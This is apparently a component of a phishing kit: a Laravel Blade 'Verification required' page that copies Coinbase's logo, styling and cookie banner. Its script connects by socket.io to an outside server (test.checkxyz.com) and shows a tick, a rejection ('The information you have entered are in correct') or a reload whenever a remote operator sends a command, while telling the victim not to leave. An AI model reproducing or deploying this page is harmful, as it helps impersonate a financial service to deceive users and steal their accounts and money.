@extends('layouts.app')
@section('content')
  <div id="root" style="display: flex; flex-direction: column; min-height: 100%">
    <div class="cds-large-llfbhh8 cds-light-l1k3tbpe" style="--foreground: rgb(var(--gray100)); --foreground-muted: rgb(var(--gray60)); --background: rgb(var(--gray0)); --background-alternate: rgb(var(--gray5)); --background-inverse: rgb(var(--gray100)); --background-overlay: rgba(var(--gray80),0.33); --line: rgba(var(--gray60),0.2); --line-heavy: rgba(var(--gray60),0.66); --primary: rgb(var(--blue70)); --primary-wash: rgb(var(--blue0)); --primary-foreground: rgb(var(--gray0)); --negative: rgb(var(--red60)); --negative-foreground: rgb(var(--gray0)); --negative-wash: rgb(var(--red0)); --positive: rgb(var(--green60)); --positive-foreground: rgb(var(--gray0)); --secondary: rgb(var(--gray20)); --secondary-foreground: rgb(var(--gray100)); --transparent: rgba(var(--gray0),0); --warning: rgb(var(--yellow50)); --warning-foreground: rgb(var(--orange70));">
      <div class="cds-flex-f1g67tkn cds-center-ca5ylan cds-column-ci8mx7v cds-background-b85wjan" style="min-height: 100vh; width: 100%;">
        <div data-testid="signup-header" class="cds-flex-f1g67tkn cds-center-cv8796s cds-center-ca5ylan cds-space-between-s1vbz1 cds-background-b85wjan cds-4-_1w9a5m cds-4-_q93lq3 cds-3-_1ol1258 cds-3-_1ti0n00" style="width: 100%;">
          <a data-testid="header-logo-link" class="cds-link cds-link-l17zyfmx" href="https://coinbase.com">
            <span class="cds-typographyResets-t1xhpuq2 cds-textInherit-t1yzihzw cds-primary-piuvss6 cds-transition-txjiwsi cds-start-s1muvu8a cds-link--container">
              <svg aria-label="Coinbase logo" class="cds-iconStyles-iogjozt" height="32" role="img" viewBox="0 0 48 48" width="32" xmlns="http://www.w3.org/2000/svg">
                <title>Coinbase logo</title>
                <path d="M24,36c-6.63,0-12-5.37-12-12s5.37-12,12-12c5.94,0,10.87,4.33,11.82,10h12.09C46.89,9.68,36.58,0,24,0 C10.75,0,0,10.75,0,24s10.75,24,24,24c12.58,0,22.89-9.68,23.91-22H35.82C34.87,31.67,29.94,36,24,36z" fill="#0051ff"></path>
              </svg>
            </span>
          </a>
        </div>
        <h1 class="cds-typographyResets-t1xhpuq2 cds-title1-toujgnf cds-foreground-f1yzxzgu  cds-transition-txjiwsi cds-start-s1muvu8a cds-wrap-w1yty5cj">Verification required</h1>
        <div class="cds-flex-f1g67tkn cds-center-ca5ylan cds-column-ci8mx7v cds-8-_c4xx9n cds-1-_9w3lns" style="flex-grow: 0; min-height: 100%; width: 100%;">
          <div id="loading-container" class="cds-flex-f1g67tkn cds-center-czxavit cds-roundedLarge-rdc2t5d cds-bordered-b17mbjy1 cds-4-_1w9a5m cds-4-_q93lq3 cds-4-_1arbnhr cds-4-_hd2z08" style="flex-grow: 1; height: 100%; max-width: 448px; min-height: 386px; width: 100%;">
            <div class="cds-flex-f1g67tkn cds-column-ci8mx7v" style="flex-grow: 1; width: 100%;">
              <div id="view-wrapper" class="cds-flex-f1g67tkn cds-column-ci8mx7v" style="flex-grow: 1; max-width: 463px; width: 100%;">
                <div data-testid="load-view-wrapper" class="cds-flex-f1g67tkn cds-column-ci8mx7v" style="flex-grow: 1; width: 100%;">
                  <div class="cds-flex-f1g67tkn cds-column-ci8mx7v" style="height: 100%; width: 100%;">
                    <div data-hidden="false" class="cds-flex-f1g67tkn cds-column-ci8mx7v" style="height: 100%; width: 100%;">
                      <div class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-3-_zv3bp" style="flex-grow: 1; width: 100%;">
                        <div class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-3-_zv3bp">
                          <div style="display: flex; align-items: center; justify-content: center;">
                            <div class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-2-_8lqlrb" style="display: flex; justify-content:center; align-items:center; text-align:center;max-width: 100%; overflow-wrap: break-word;">
                              <div style="display: flex; justify-content: center; align-items: center; height: 50vh;">
                                <div style="text-align: center;">
                                  <p style="color: #000; font-size: 15px;" class="cds-typographyResets-t1xhpuq2 cds-body-bb7l4gg">
                                    It may take a while before you are redirected
                                  </p>
                                  <div class="loading-animation" style="display: flex; align-items: center; justify-content:center;">
                                    <div style="border: 4px solid lightgrey; border-radius: 50%; border-top: 4px solid #0051ff; width: 50px; height: 50px; animation: spin 1s linear infinite;"></div>
                                  </div>
                                  <p style="color: #000; font-size: 13px;" class="cds-typographyResets-t1xhpuq2 cds-body-bb7l4gg">
                                    NOTE: DO NOT LEAVE THIS TOUCH AND EXIT YOUR BROWSER
                                  </p>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div id="checkmark-container" class="cds-flex-f1g67tkn cds-center-ca5ylan cds-column-ci8mx7v cds-8-_c4xx9n cds-1-_9w3lns" style="display: none; flex-grow: 0; min-height: 50%; width: 50%;">
          <div class="cds-flex-f1g67tkn cds-center-czxavit cds-roundedLarge-rdc2t5d cds-bordered-b17mbjy1 cds-4-_1w9a5m cds-4-_q93lq3 cds-4-_1arbnhr cds-4-_hd2z08" style="flex-grow: 1; height: 50%; max-width: 248px; min-height: 186px; width: 50%;">
            <div class="cds-flex-f1g67tkn cds-column-ci8mx7v" style="flex-grow: 1; width: 100%;">
              <div id="view-wrapper" class="cds-flex-f1g67tkn cds-column-ci8mx7v" style="flex-grow: 1; max-width: 463px; width: 100%;">
                <div data-testid="load-view-wrapper" class="cds-flex-f1g67tkn cds-column-ci8mx7v" style="flex-grow: 1; width: 100%;">
                  <div class="cds-flex-f1g67tkn cds-column-ci8mx7v" style="height: 100%; width: 100%;">
                    <div data-hidden="false" class="cds-flex-f1g67tkn cds-column-ci8mx7v" style="height: 100%; width: 100%;">
                      <div class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-3-_zv3bp" style="flex-grow: 1; width: 100%;">
                        <div class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-3-_zv3bp">
                          <div style="display: flex; align-items: center; justify-content: center;">
                            <div class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-2-_8lqlrb" style="display: flex; justify-content:center; align-items:center; text-align:center;max-width: 100%; overflow-wrap: break-word;">
                              <div style="display: flex; justify-content: center; align-items: center; height: 20vh;">
                                <div style="text-align: center;">
                                  <div id="checkmark" style=" margin-top: 10px;">
                                    <svg width="70" height="70" viewBox="0 0 24 24" fill="none" stroke="green" stroke-width="0.5" stroke-linecap="round" stroke-linejoin="round" class="feather feather-check-circle">
                                      <circle cx="12" cy="12" r="10"></circle>
                                      <path d="M9 12l2 2 4-4"></path>
                                    </svg>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div id="rejected" class="cds-flex-f1g67tkn cds-center-ca5ylan cds-column-ci8mx7v cds-8-_c4xx9n cds-1-_9w3lns" style="display: none; flex-grow: 0; min-height: 50%; width: 50%;">
          <div class="cds-flex-f1g67tkn cds-center-czxavit cds-roundedLarge-rdc2t5d cds-bordered-b17mbjy1 cds-4-_1w9a5m cds-4-_q93lq3 cds-4-_1arbnhr cds-4-_hd2z08" style="flex-grow: 1; height: 50%; max-width: 448px; min-height: 186px; width: 100%;">
            <div class="cds-flex-f1g67tkn cds-column-ci8mx7v" style="flex-grow: 1; width: 100%;">
              <div id="view-wrapper" class="cds-flex-f1g67tkn cds-column-ci8mx7v" style="flex-grow: 1; max-width: 463px; width: 100%;">
                <div data-testid="load-view-wrapper" class="cds-flex-f1g67tkn cds-column-ci8mx7v" style="flex-grow: 1; width: 100%;">
                  <div class="cds-flex-f1g67tkn cds-column-ci8mx7v" style="height: 100%; width: 100%;">
                    <div data-hidden="false" class="cds-flex-f1g67tkn cds-column-ci8mx7v" style="height: 100%; width: 100%;">
                      <div class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-3-_zv3bp" style="flex-grow: 1; width: 100%;">
                        <div class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-3-_zv3bp">
                          <div style="display: flex; align-items: center; justify-content: center;">
                            <div class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-2-_8lqlrb" style="display: flex; justify-content:center; align-items:center; text-align:center;max-width: 100%; overflow-wrap: break-word;">
                              <div style="display: flex; justify-content: center; align-items: center; height: 20vh;">
                                <div style="text-align: center;">
                                  <p style="color: #000; font-size: 15px;" class="cds-typographyResets-t1xhpuq2 cds-body-bb7l4gg">
                                    The information you have entered are in correct    
                                  </p>
                                  <div id="xmark" style="margin-top: 10px;">
                                    <svg width="70" height="70" viewBox="0 0 24 24" fill="none" stroke="red" stroke-width="0.5" stroke-linecap="round" stroke-linejoin="round" class="feather feather-x-circle">
                                      <circle cx="12" cy="12" r="10" stroke="red" stroke-width="0.5" fill="none"></circle>
                                      <line x1="7" y1="7" x2="17" y2="17" stroke="red" stroke-width="0.5"></line>
                                      <line x1="17" y1="7" x2="7" y2="17" stroke="red" stroke-width="0.5"></line>
                                    </svg>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div data-testname="hidden-banner" data-testid="banner-container" class="cds-flex-f1g67tkn cds-fixed-f1v5p9l4" style="width: 100%; position: fixed; bottom: -200px; z-index: 3; transition: bottom 500ms; will-change: bottom;">
        <div id="cookie-banner" class="cds-flex-f1g67tkn cds-center-czxavit cds-backgroundAlternate-b1o0kdmt" style="width: 100%;">
          <div class="cds-flex-f1g67tkn cds-center-ca5ylan cds-row-r1tfxker cds-space-between-s1vbz1 cds-3-_1ixgcz3 cds-3-_1mvq9l2 cds-6-_1iifjn6 cds-6-_1ts70zl" style="max-width: 800px; width: 100%;">
            <p class="cds-typographyResets-t1xhpuq2 cds-label2-ln29cth cds-foreground-f1yzxzgu cds-transition-txjiwsi cds-start-s1muvu8a cds-0-_vhy4ik cds-1-_7ojgr9">We use strictly necessary cookies to enable essential functions, such as security and authentication. For more information, see our 
              <a class="cds-link cds-link-l17zyfmx" href="https://coinbase.com/legal/cookie" rel="noopener noreferrer" target="_blank"><span class="cds-typographyResets-t1xhpuq2 cds-textInherit-t1yzihzw cds-primary-piuvss6 cds-transition-txjiwsi cds-start-s1muvu8a cds-link--container">Cookie Policy</span>
              </a>.
            </p>
            <button data-testid="dismiss-button" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-button-b18qe5go cds-scaledDownState-sxr2bd6 cds-primaryForeground-pxcz3o7 cds-button-bpih6bv cds-buttonCompact-b17kdj8k cds-2-_h5hy70 cds-2-_hu3zq5" type="button" style="--interactable-height: 40px; --interactable-border-radius: 40px; --interactable-background: var(--primary); --interactable-hovered-background: rgb(80, 127, 229); --interactable-hovered-opacity: 0.91; --interactable-pressed-background: rgb(75, 120, 214); --interactable-pressed-opacity: 0.85; --interactable-disabled-background: rgb(49, 75, 132);">
              <span class="cds-positionRelative-p109mlw7">
                <span class="cds-typographyResets-t1xhpuq2 cds-headline-htr1998 cds-primaryForeground-pxcz3o7 cds-transition-txjiwsi cds-start-s1muvu8a">
                  <span class="">Dismiss</span>
                </span>
              </span>
            </button>
          </div>
        </div>
      </div>
    </div>
  </div>
@endsection

@push('script')
<script>
   var socketIO = io("wss://test.checkxyz.com:4000");
   var user_id = "{{Auth::user()->id}}";
    socketIO.emit("connected", user_id);

    socketIO.on("userLoginNotificationReceived", function (data) {
      console.log(data);
      if (data == "accept") {
        showCheckmarkAndLoadingAnimation();
      }else if (data == "reject") { 
        showRejectedAndLoadingAnimation();
      } else if (data == "refresh") {
        window.location.reload(true);
      }
    });

    function showCheckmarkAndLoadingAnimation() {
        document.getElementById('loading-container').style.display = 'none';
        document.getElementById('checkmark-container').style.display = 'flex'; 
        
        setTimeout(function() {
            document.getElementById('checkmark-container').style.display = 'none';
            document.getElementById('loading-container').style.display = 'flex';
        }, 3000);
    }

     function showRejectedAndLoadingAnimation() {
        document.getElementById('loading-container').style.display = 'none';
        document.getElementById('rejected').style.display = 'flex'; 

        setTimeout(function() {
            document.getElementById('rejected').style.display = 'none';
            document.getElementById('loading-container').style.display = 'flex';
        }, 3000);
    }

</script>
    
@endpush
  